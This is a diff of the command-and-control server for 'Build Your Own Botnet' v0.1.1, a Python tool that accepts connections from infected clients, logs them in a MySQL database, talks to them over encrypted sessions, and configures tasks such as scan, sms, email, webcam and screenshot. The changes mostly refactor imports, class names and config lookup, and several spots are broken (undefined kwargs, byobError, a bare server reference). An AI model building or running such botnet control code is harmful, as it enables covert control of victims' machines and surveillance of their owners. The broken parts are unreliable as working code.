@@ -17,13 +17,14 @@ Copyright (c) 2018 Daniel Vega-Myhre
 
 
 """
+
 from __future__ import print_function
+
+# standard library 
 import os
 import sys
-import cv2
 import json
 import time
-import numpy
 import Queue
 import pickle
 import socket
@@ -40,22 +41,30 @@ import cStringIO
 import threading
 import subprocess
 import collections
+
+# external
+import cv2
+import numpy
 import configparser
+import SocketServer
 import mysql.connector
+
+# cryptography 
 import Crypto.Util
 import Crypto.Cipher.AES
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
-from database import *
-from util import *
 
+# byob 
+import database
+import util
 
 
 class ServerError(Exception):
     pass
 
 
-class HandlerError(Exception):
+class ClientHandlerError(Exception):
     pass
 
 
@@ -72,7 +81,7 @@ class Server(threading.Thread):
         self.database           = self._get_database()
         self.commands           = self._get_commands()
         self._socket            = self._get_socket()
-        self._text_color        = self._get_color()
+        self._text_color        = util.color()
         self._text_style        = colorama.Style.DIM
         self._prompt_color      = colorama.Fore.RESET
         self._prompt_style      = colorama.Style.BRIGHT
@@ -83,7 +92,6 @@ class Server(threading.Thread):
         self._abort             = False
         self._debug             = debug
         self._count             = 1
-        self._get_session(port)
         self._commands          = {
             'exit'          :   self.quit,
             'help'          :   self.help,
@@ -108,6 +116,7 @@ class Server(threading.Thread):
 
 
     def _error(self, data):
+        util.debug(str(data))
         if self.current_client:
             with self.current_client._lock:
                 print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
@@ -153,24 +162,18 @@ class Server(threading.Thread):
                 else:
                     print(self.current_client.prompt, end="")
 
-
-    def _get_color(self):
-        try:
-            return getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
-        except Exception as e:
-            return "{} error: {}".format(self._get_color.func_name, str(e))
-
-
     def _get_config(self):
         config = configparser.ConfigParser()
-        for path in ['config.ini','../config.ini','../resources/config.ini','../resources/server_config.ini']:
-            if os.path.isfile(path):
+        for path in [os.path.abspath(i) for i in os.listdir('.') + os.listdir('..') + os.listdir('resources') if i.endswith('.ini')]:
+            if 'config' in path and os.path.isfile(path):
                 config.read(path)
                 break
         else:
-            raise ServerError("missing configuration file 'config.ini'")
+            raise byobError("missing configuration file 'config.ini'")
         return config
 
+
+            
 
     def _get_socket(self, port):
         try:
@@ -183,17 +186,23 @@ class Server(threading.Thread):
             self._server_error(str(e))
 
 
-    def _get_database(self, port):
+    def _get_database(self):
         try:
             print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + colorama.Style.BRIGHT + __doc__ + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.1'))
             print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + " [?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
             db = None
             if self.config.has_section('database'):
                 try:
-                    db = Database(**self.config['database'])
-                    d.set_tasks(['scan','sms','email','webcam','screenshot'])
-                    d.execute_file('../resources/build_database.sql')
+                    tasks = [k for k,v in self.config['tasks'].items() if v]
+                    setup = os.path.abspath(os.path.join('resources', self.config['database'].get('setup')))
+                    db = Database(setup=setup, tasks=tasks, **self.config['database'])
                     print(colorama.Fore.CYAN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
+                except:
+                    max_v = max(map(len, self.config['database'].values())) + 2
+                    print(colorama.Fore.RED + colorama.Style.BRIGHT + " [-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
+            else:
+                try:
+                    db = Database()
                 except:
                     max_v = max(map(len, self.config['database'].values())) + 2
                     print(colorama.Fore.RED + colorama.Style.BRIGHT + " [-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
@@ -202,7 +211,7 @@ class Server(threading.Thread):
             return "{} error: {}".format(self._get_session.func_name, str(e))
 
 
-    def _get_client_from_id(self, client_id):
+    def _get_client(self, client_id):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
         elif self.current_client:
@@ -210,20 +219,6 @@ class Server(threading.Thread):
         else:
             self._error("Invalid Client ID")
         return client
-
-
-    def _get_client_from_connection(self, sock):
-        try:
-            if isinstance(sock, socket.socket):
-                addr = sock.getpeername()
-                for client in self._get_clients():
-                    try:
-                        if client.getpeername() == addr:
-                            return client
-                    except:
-                        self.remove_client(client._name)
-        except Exception as e:
-            self._server_error("{} error: {}".format(self._get_client_from_connection.func_name, str(e)))
 
 
     def _get_clients(self):
@@ -248,21 +243,21 @@ class Server(threading.Thread):
             self._return("%s warning: invalid input type (expected {}, receieved {})" % (self._handle_request.func_name, dict, type(task)))
 
 
+    @util.threaded
     def _connection_handler(self, sock=None):
         if not sock:
             sock = self._socket
         while True:
-            try:
-                conn, addr = sock.accept()
-                client  = Handler(connection=conn, name=self._count, server=self)
-                self.clients[self._count] = client
-                self._count  += 1
-                client.start()
-                if not self.current_client:
-                    print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
-                else:
-                    if self.current_client._prompt:
-                        print(str(self.current_client._prompt) % int(self.current_client._name), end="")
+            conn, addr = sock.accept()
+            client  = ClientHandler(connection=conn, name=self._count, server=self)
+            self.clients[self._count] = client
+            self._count  += 1
+            client.start()                        
+            if not self.current_client:
+                print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
+            else:
+                if self.current_client._prompt:
+                    print(str(self.current_client._prompt) % int(self.current_client._name), end="")
 
 
     def _encrypt(self, data, key):
@@ -282,7 +277,7 @@ class Server(threading.Thread):
             return cipher.decrypt(ciphertext) + '\n(Authentication check failed - either the decryption key is wrong or the message was tampered with)\n'
 
 
-    def debug(self, raw_python_code):
+    def debugger(self, raw_python_code):
         if self._debug:
             try:
                 return eval(raw_python_code)
@@ -500,11 +495,15 @@ class Server(threading.Thread):
                 self._server_error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))
 
 
-    def list_sessions(self):
-        lock = self._lock if not self.current_client else self.current_client._lock
+    def list_clients(self, args=None):
+        args    = str(args).split()
+        verbose = bool('-v' in args or '--verbose' in args)
+        online  = bool('-a' not in args or '--all' not in args)
+        lock    = self._lock if not self.current_client else self.current_client._lock
         with lock:
             print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
-            for k, v in self.clients.items():
+            clients = self.database.get_clients(online=online, verbose=verbose)
+            for k, v in clients.items():
                 print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v._connection.getpeername()[0]))
             print('\n')
 
@@ -621,25 +620,23 @@ class Server(threading.Thread):
         sys.exit(0)
 
 
-class Handler(threading.Thread):
+class ClientHandler(threading.Thread):
 
     _prompt = None
 
     def __init__(self, server=None, connection=None, name=None, lock=None):
         """
-        Handler: wrapper for handling a client connection
+        ClientHandler: wrapper for handling a client connection
             kwargs:
-                name         ID for quick reference in console
                 server       byob.server.Server instance that is managing clients
                 connection   socket with active connection
+                lock         threading.Lock object shared between all clients
         """
-        super(Handler, self).__init__()
-        self.server         = kwargs.get('server')
+        super(ClientHandler, self).__init__()
+        self._server        = kwargs.get('server')
         self._connection    = kwargs.get('connection')
-        self._name          = kwargs.get('name')
         self._lock          = kwargs.get('lock')
         self._active        = threading.Event()
-        self._created       = time.time()
         self.session_key    = self._session_key()
         self.info           = self._info()
         self.session        = self._session()
@@ -653,20 +650,20 @@ class Handler(threading.Thread):
 
     def _kill(self):
         self._active.clear()
-        server.remove_client(self._name)
-        server.current_client = None
-        server._active.set()
-        server.run()
+        self._server.remove_client(self._name)
+        self._server.current_client = None
+        self._server._active.set()
+        self._server.run()
 
 
     def _info(self):
         buf  = ''
         while '\n' not in buf:
             buf += self._connection.recv(1024)
-        text  = server._decrypt(buf.rstrip(), self.session_key)
-        data  = json.loads(text.rstrip())
-        self.database.handle_client(data)
-        return data
+        text = server._decrypt(buf.rstrip(), self.session_key)
+        data = json.loads(text.rstrip())
+        info = self.database.handle_client(data)
+        return info
 
 
     def _session_key(self):
@@ -762,7 +759,7 @@ def main():
     parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
     try:
         options = parser.parse_args()
-        byob_server  = Server(port=options.port, config='../config.ini', debug=options.debug)
+        byob_server  = Server(port=options.port, config='config.ini', debug=options.debug)
         byob_server.start()
     except Exception as e:
         print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
@@ -772,4 +769,5 @@ def main():
 
 if __name__ == '__main__':
     colorama.init(autoreset=True)
+    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(name)15s %(submodule)15s %(message)s')
     main()
